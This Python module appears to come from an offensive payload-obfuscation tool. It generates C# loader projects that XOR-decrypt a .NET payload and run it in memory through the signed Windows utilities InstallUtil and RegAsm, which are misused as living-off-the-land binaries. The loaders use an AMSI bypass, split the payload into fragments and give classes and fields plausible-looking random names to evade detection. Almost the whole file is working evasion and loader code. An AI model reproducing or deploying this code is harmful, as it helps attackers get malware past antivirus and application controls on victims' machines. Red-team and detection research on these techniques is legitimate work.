"""LOLBAS output format passes — InstallUtil, RegAsm, Rundll32.

Each pass takes a .NET assembly (bytes), XOR-encrypts it, and generates
a C# project that loads the payload via the corresponding LOLBAS technique.
All three use HWBP+VEH AMSI bypass, payload fragmentation, and junk classes.
"""

from __future__ import annotations

import secrets
import shutil
import tempfile
from pathlib import Path

from penumbra.dotnet._loader_utils import (
    compile_dotnet_project,
    encrypt_and_encode,
    generate_standard_project_files,
    plausible_class,
    plausible_field,
    plausible_name,
)
from penumbra.types import PassConfig


def _generate_installutil_project(
    payload_b64: str, key_b64: str, project_dir: Path
) -> None:
    """Generate InstallUtil-compatible C# project."""
    used = set[str]()

    main_cls = plausible_class()
    used.add(main_cls)
    key_field = plausible_field()
    result_var = plausible_field()
    plain_var = plausible_field()
    asm_var = plausible_field()
    ep_var = plausible_field()
    args_var = plausible_field()
    idx_var = plausible_field()

    amsi_cls, amsi_method, reassemble_expr, _ = generate_standard_project_files(
        project_dir, payload_b64, key_b64, used
    )

    # .csproj — net472 Exe (InstallUtil needs .exe)
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>Exe</OutputType>\n"
        "    <TargetFramework>net472</TargetFramework>\n"
        "    <LangVersion>10</LangVersion>\n"
        "  </PropertyGroup>\n"
        "  <ItemGroup>\n"
        '    <Reference Include="System.Configuration.Install" />\n'
        "  </ItemGroup>\n"
        "</Project>\n"
    )

    program_cs = (
        "using System;\n"
        "using System.Collections;\n"
        "using System.ComponentModel;\n"
        "using System.Configuration.Install;\n"
        "using System.Reflection;\n\n"
        "[RunInstaller(true)]\n"
        f"public class {main_cls} : Installer\n"
        "{\n"
        f'    private static readonly string {key_field} = "{key_b64}";\n\n'
        f"    public override void Uninstall(IDictionary {plausible_field()})\n"
        "    {\n"
        f"        {amsi_cls}.{amsi_method}();\n\n"
        f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
        f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
        f"        var {plain_var} = new byte[{result_var}.Length];\n"
        f"        for (var i = 0; i < {result_var}.Length; i++)\n"
        f"            {plain_var}[i] = (byte)({result_var}[i]"
        f" ^ {idx_var}[i % {idx_var}.Length]);\n\n"
        f"        var {asm_var} = Assembly.Load({plain_var});\n"
        f"        var {ep_var} = {asm_var}.EntryPoint;\n"
        f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
        f"            ? new object[] {{ new string[0] }}\n"
        f"            : Array.Empty<object>();\n"
        f"        {ep_var}.Invoke(null, {args_var});\n"
        "    }\n\n"
        "    public static void Main() { }\n"
        "}\n"
    )
    (project_dir / "Program.cs").write_text(program_cs)


def _generate_regasm_project(
    payload_b64: str, key_b64: str, project_dir: Path
) -> None:
    """Generate RegAsm-compatible C# project."""
    used = set[str]()

    main_cls = plausible_class()
    used.add(main_cls)
    key_field = plausible_field()
    result_var = plausible_field()
    plain_var = plausible_field()
    asm_var = plausible_field()
    ep_var = plausible_field()
    args_var = plausible_field()
    idx_var = plausible_field()
    guid = (
        f"{secrets.token_hex(4)}-{secrets.token_hex(2)}-"
        f"{secrets.token_hex(2)}-{secrets.token_hex(2)}-"
        f"{secrets.token_hex(6)}"
    )

    amsi_cls, amsi_method, reassemble_expr, _ = generate_standard_project_files(
        project_dir, payload_b64, key_b64, used
    )

    # .csproj — net472 Library (RegAsm needs .dll)
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>Library</OutputType>\n"
        "    <TargetFramework>net472</TargetFramework>\n"
        "    <LangVersion>10</LangVersion>\n"
        "  </PropertyGroup>\n"
        "</Project>\n"
    )

    method_name = plausible_name()
    param_name = plausible_field()
    program_cs = (
        "using System;\n"
        "using System.Reflection;\n"
        "using System.Runtime.InteropServices;\n\n"
        "[ComVisible(true)]\n"
        f'[Guid("{guid}")]\n'
        f"public class {main_cls}\n"
        "{\n"
        f'    private static readonly string {key_field} = "{key_b64}";\n\n'
        "    [ComUnregisterFunction]\n"
        f"    public static void {method_name}(string {param_name})\n"
        "    {\n"
        f"        {amsi_cls}.{amsi_method}();\n\n"
        f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
        f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
        f"        var {plain_var} = new byte[{result_var}.Length];\n"
        f"        for (var i = 0; i < {result_var}.Length; i++)\n"
        f"            {plain_var}[i] = (byte)({result_var}[i]"
        f" ^ {idx_var}[i % {idx_var}.Length]);\n\n"
        f"        var {asm_var} = Assembly.Load({plain_var});\n"
        f"        var {ep_var} = {asm_var}.EntryPoint;\n"
        f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
        f"            ? new object[] {{ new string[0] }}\n"
        f"            : Array.Empty<object>();\n"
        f"        {ep_var}.Invoke(null, {args_var});\n"
        "    }\n"
        "}\n"
    )
    (project_dir / "Program.cs").write_text(program_cs)


_GENERATORS = {
    "installutil": _generate_installutil_project,
    "regasm": _generate_regasm_project,
}


class InstallUtilPass:
    """Generate InstallUtil-compatible loader exe."""

    opt_in = True

    @property
    def name(self) -> str:
        return "lolbas-installutil"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        return _build_lolbas(data, "installutil", config)


class RegAsmPass:
    """Generate RegAsm-compatible loader dll."""

    opt_in = True

    @property
    def name(self) -> str:
        return "lolbas-regasm"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        return _build_lolbas(data, "regasm", config)


def _build_lolbas(data: bytes, fmt: str, config: PassConfig) -> bytes:
    """Build a LOLBAS project and return compiled bytes (or export source)."""
    payload_b64, key_b64 = encrypt_and_encode(data)
    tmp_dir = tempfile.mkdtemp(prefix=f"penumbra_lolbas_{fmt}_")
    tmp_path = Path(tmp_dir)

    try:
        _GENERATORS[fmt](payload_b64, key_b64, tmp_path)

        if config.extra.get("source"):
            from penumbra.dotnet._loader_utils import export_source_project

            output_dir = Path(str(config.extra.get("source_output", tmp_path)))
            export_source_project(tmp_path, output_dir)
            return b""

        if not shutil.which("dotnet"):
            raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
        return compile_dotnet_project(tmp_path, "net472")
    finally:
        if not config.extra.get("source"):
            shutil.rmtree(tmp_dir, ignore_errors=True)
